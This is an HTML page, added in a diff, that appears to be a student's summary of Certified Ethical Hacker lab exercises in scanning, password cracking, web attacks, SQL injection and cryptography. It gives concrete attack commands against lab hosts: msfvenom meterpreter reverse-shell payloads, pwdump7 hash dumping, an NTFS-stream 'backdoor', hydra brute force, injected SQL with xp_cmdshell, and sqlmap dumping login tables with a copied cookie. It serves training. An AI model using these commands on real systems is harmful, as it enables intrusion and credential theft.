@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <link rel="stylesheet" type="text/css" href="../style.css"/>
+    <title>Certified Ethical Hacker</title>
+</head>
+<body>
+<header class="back"><a href="../writing.html">Back</a></header>
+<div class="writing">
+    <h3>Vulnerability Analysis</h3>
+    <p>Three activities of network vulnerability include checking for PHP versions, checking to see if Microsoft Server Message Block is enabled, and vulnerability in Schannel. PHP versions must be updated regularly to be safe, an outdated PHP is a high-risk vulnerability. Microsoft Server Message Block can be taken advantage of by allowing attackers to send packets to disclose sensitive information, having a denial of service vulnerability, and having remote code execution vulnerabilities. This is considered a critical vulnerability. Finally, a vulnerability in Shannel could allow remote code execution. Improper processing of packets can be exploited and hackers would send packets to the Windows server.
+        Begin by adding a new advanced scan policy in Nessus. A port scan can be turned on and can help verify open TCP ports found by local port enumerators. After setting up a custom scan, the user must enter a target IP address and finally launch the scan. The scan will quickly show different vulnerabilities and the level of threat it imposes, from critical, high, medium, low, and informational. The entire report can then be exported as a PDF file if needed.
+        Access nikto options by opening up terminal and entering the command nikto -h. This will display all the types of actions nikto can take. Entering nikto -h URL -Tuning 1 will return the IP address of the input site. Just through those simple commands, it will return the server name, header, CGI directories, HTTP methods, and the number of requests. This can determine outdated versions of servers, specific problems, all while being stealthy.
+    </p>
+    <br>
+    <h3>System Hacking </h3>
+    <p>  Modern day computer passwords are as important as bank vault codes. Users must be aware of the dangers and understand how to mitigate the vulnerabilities before their passwords can be compromised. The common ways to protect themselves are to never click email links, download directly from trustworthy websites, and not connect to public internet. Although the last may be difficult, however, connecting to a public internet poses great vulnerabilities.
+        To begin, open up command prompt as administrator and type the command “wmic useraccount get name,sid”. This command will display all the account names and theirIDs. Now run the directory of the file pwdump7 (C:\...\pwdump7) and open up PwDump7.exe. The user accounts’ password hashes will be displayed. Save thee hashes in a txt file, then open ophcrack.exe. Open up the saved hashes within ophcrack, select the corresponding Windows version, and hit crack. The decoded password will be displayed subsequently.
+        To escalate privileges by exploiting client side vulnerabilities, type in “msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=(IP of machine) LPORT=444 -o (directory of exploit exe)”. Next, create a directory to share the file to the victim’s machine, and provide the permissions and copy the file to the shared location. Start the Apache server, and set the handler and payload settings. Once the victim downloads the file, the attacker will gain remote control of the target machine.
+        Hiding files using NTFS streams is simple, start by opening up the calc.exe application, then make a random txt file and save that as a common name. Hide the calc.exe file within the txt file by typing in directory\calc.exe > directory\readme.txt:calc.exe in the command prompt. Then enter the command “mklink backdoor.exe readme.txt:calc.exe”. After inputting backdoor.exe, a harmless looking calculator application will open up.
+        The final exercise was to covert channels using Covert_TCP. Open up command prompt and enter a series of commands: “mkdir send”, “cd send/”, and “echo “Secret Message” > message.txt”. Next, copy the covert.tcp.c file and paste it into the send folder. Returning to the command prompt, enter “cc -o covert_tcp covert_tcp.c”. Through examining the communication between the target machine and the attacking machine, the secret message could be seen sent separately.
+    </p>
+    <br>
+    <h3>Hacking Web Applications</h3>
+    <p>
+        Parameter tampering is going to the URL of a website and changing around the parameters. If the website has a simple way of storing data, personal information could be easily reached just by changing a few numbers on the URL.Cross-Site Scripting, on the other hand, is a little more complex and requires the attacker to send a request to the target. The attacker will force the target to perform scripts without them noticing.
+        One of the easiest ways to access information is to alter the URL. In the lab example, moviescope.com had profiles that were supposed to be accessed through logging in with a username and password. However, just by simply changing the id number on the URL directs the user into another person’s profile without any difficulty, which s known as parameter tampering. Another easy way to tamper is by exploiting the XSS vulnerabilities. This is done by entering a malicious script in an input field.
+        The lab begins by entering the IP address of the device, with the command line script “msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.10.11 lport=4444 -f raw”. This generates a raw payload, which can be copied and pasted into a text processor. After saving it as a .php file, upload it to an unsuspecting website. Enter the location of the uploaded file to execute the payload. Through a separate listener device, it is evident that the php file went through and affected the website. To exploit a medium security level website, a Burp Suite proxy must be set up beforehand. For a high-security level website, a keyword must be entered before the php command, must be a file extension .jpg.
+        To perform a cross-site request forgery attack, begin by typing ”wpscan -u http://10.10.10.12:8080/CEH --enumerate vp” in a terminal. WPScan will enumerate the plugins in the CEH WordPress site, and once completed, alist of vulnerable plugins will be shown. Connect to the server and drop a whitelist script into the website. If the target user opens that script, it will execute and automatically turn the attacker’s device into a whitelisted device.
+
+
+    </p>
+    <br>
+    <h3>Hacking Web Servers</h3>
+    <p>
+        TSYN flood is a type of denial-of-service attack caused by an attacker sending enormous amounts of connections to a server, without actually completing the connection. The server will eventually run out of resources to respond to actual inquiries. Ping flood, on the other hand, is another type of denial-of-service attack where the attacker sends echo request packets rapidly, overwhelming the target device. These attacks are often accompanied by port scans, where the attacker can find out which ports of the networks are open, to see where they can send these requests.
+        One of the methods of footprinting a web server is to use ID Serve. Start off by launching the idserve.exe. Enter the IP address of the target and click Query to begin. Just like so, the server’s PHP version and the role of the server can be determined.
+        To crack FTP credentials using a dictionary attack, perform a nmap scan on the target machine to find out if the Ftp port is open. Then, check to see if an FTP server is hosted on the Windows 10 machine. On a new terminal, enter the command hydra -L with the directory to the username and password lists, and ftp://(IP Address). This is to begin a brute force attack to test different combinations of usernames and passwords. When the attack is finished, all the successful results will be shown in the terminal.
+    </p>
+    <br>
+    <h3>SQL Injection</h3>
+    <p>
+        A form of powerful attack is a SQL injection attack. SQL injection attack is when an attacker inputs SQL commands into a server and the server mistakenly running the given command. These can be done either through file upload or inputting commands in an input field, such as a username input. These could be anywhere from creating new accounts, dropping the entire table for username and passwords, to retrieving client information through SQL codes.
+        To perform a SQL injection attack on an MS SQL database, type in “‘;insert into login values(“‘name’,’password’); --” into where the username is usually supposed to go and log in. If there are no error messages, then the SQL injection query was successful. To confirm, log in with the username and password created just now, if it goes through, then the SQL went through. Another command to try is “ blah';exec master..xp_cmdshell 'ping www.moviescope.com -l 65000 -t'; --”, which will ping the website moviescope.com.
+        Begin by launching N-Stalker Free X. Input the URL of the desired website and select OWASP Policy, then start the scan wizard. After adjusting the settings of N-Stalker, hit Start Scan to begin the scanning. N-Stalker will scan the site in four different steps: Spider, Information Gather, Run Modules, and Sig Scanner. N-Stalker will display a summary of vulnerabilities at the end of the scan.
+        Log into the desired website and right-click to inspect element on the profile page. Find the Developer Tools section and click Console tab, find “document.cookie”. Copy the cookie value and paste it into a command line argument “sqlmap -u websiteurl” --cookie=<”cookie value”> --dbs”. SQLMAP will retrieve the database present in th MS SQL server, as well as information regarding the webserver. Choose a database and use SQLMAP to retrieve the tables in the database. Next, retrieve the columns associated with the tables. Finally, by entering “sqlmap -u “website url” --cookie=<”cookie value”> -D moviescope -T User_Login --dump”, the retrieved username and passwords will be shown.
+    </p>
+    <br>
+    <h3>Cryptography</h3>
+    <p>
+        A form of cryptography is known as the public key cryptography. Public key cryptography uses public keys and private keys to encrypt and decrypt data. Public keys are distributed widely, while only the owner hols the private keys. In this lab, one-way functions are also used, which is a function that is easy to compute every input, but difficult to revert the output to the input, thus, one way.
+        To calculate One-Way Hashes using HashCalc, double-click on HashCalc to boot it up. Select the data format and the data desired, then hit calculate. HashCalc will return the hashes. Now repeat the steps with a known password on a text file, this time, the hash value is different and shows that the location of the item has changed. This exercise was to show file integrity monitoring. The next type of hash to be calculated is the MD5 hashes. To find the MD5 hash value, right-click the desired file, and select MD5 Calculator. Just by simply hitting “calculate” the MD5 digest will be displayed on the application. This is to see if any third person has tampered with the file or not.
+        File and text encryption could be done easily via CryptoForge. Begin by running and installing CryptoForge.exe. After the installation is complete, right-click on the desired file and select encrypt from the context menu. Just like that, a file is encrypted in the same location and the old file will be deleted. On the other hand, use CryptoForge with a different user and decrypt the file. If the user has access to the encryption password, they can easily decrypt it. Encryption may be beneficial by protecting sensitive information that must be sent through the internet.
+
+    </p>
+
+
+</div>
+</body>
+</html>
